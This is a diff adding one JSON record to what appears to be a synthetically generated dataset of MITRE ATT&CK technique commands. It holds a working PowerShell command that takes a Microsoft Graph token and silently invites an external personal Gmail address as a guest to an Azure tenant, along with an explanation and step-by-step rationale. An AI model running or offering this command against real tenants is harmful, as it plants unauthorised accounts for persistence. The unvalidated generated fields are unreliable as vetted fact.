@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1585",
+  "platform": "Cloud",
+  "shell": "Powershell",
+  "command": "$token=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv); $body='{\"invitedUserEmailAddress\":\"nora.chen.personal@gmail.com\",\"invitedUserDisplayName\":\"Nora Chen\",\"inviteRedirectUrl\":\"https://portal.azure.com/\",\"sendInvitationMessage\":false}'; Invoke-RestMethod -Method POST -Uri \"https://graph.microsoft.com/v1.0/invitations\" -Headers @{Authorization=\"Bearer $token\";'Content-Type'='application/json'} -Body $body | ConvertTo-Json",
+  "explanation": "Creates a guest account via invitation without sending an email, establishing an external-looking persona inside the tenant.",
+  "rationale_steps": [
+    "Acquire a Graph token from Azure CLI for authenticated requests.",
+    "Post to the invitations endpoint to create a B2B guest silently.",
+    "Return the invitation resource as JSON for automation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1585-a77285be-8287e86d",
+  "source_prompt_hash": "a77285be",
+  "timestamp_utc": "2025-09-30T07:39:21.925097Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
